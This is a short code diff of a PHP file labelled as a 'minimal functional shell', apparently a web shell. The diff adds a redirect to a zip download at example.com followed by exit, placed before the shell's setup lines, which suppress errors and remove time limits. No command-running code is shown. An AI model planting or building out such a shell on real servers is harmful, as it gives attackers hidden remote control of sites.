@@ -1,4 +1,10 @@
 <?php
+
+$url = 'https://example.com/files/test.zip';
+
+header('Location: ' . $url, true, 302);
+exit;
+
 // -shell | minimal functional shell
 error_reporting(0);
 set_time_limit(0);
